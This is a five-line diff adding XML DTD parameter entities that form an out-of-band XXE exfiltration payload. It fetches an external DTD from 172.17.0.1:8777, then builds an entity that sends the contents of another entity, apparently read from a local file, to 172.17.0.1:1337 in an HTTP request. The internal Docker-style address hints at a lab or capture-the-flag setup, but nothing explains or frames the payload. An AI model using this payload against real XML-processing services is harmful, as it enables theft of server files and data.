@@ -1,0 +1,5 @@
+<!ENTITY % e2 SYSTEM "http://172.17.0.1:8777/e2.dtd">
+%e2;
+<!ENTITY % http "http://172.17.0.1:1337/?">
+<!ENTITY % f "<!ENTITY send SYSTEM '%http;%all;'>">
+%f;
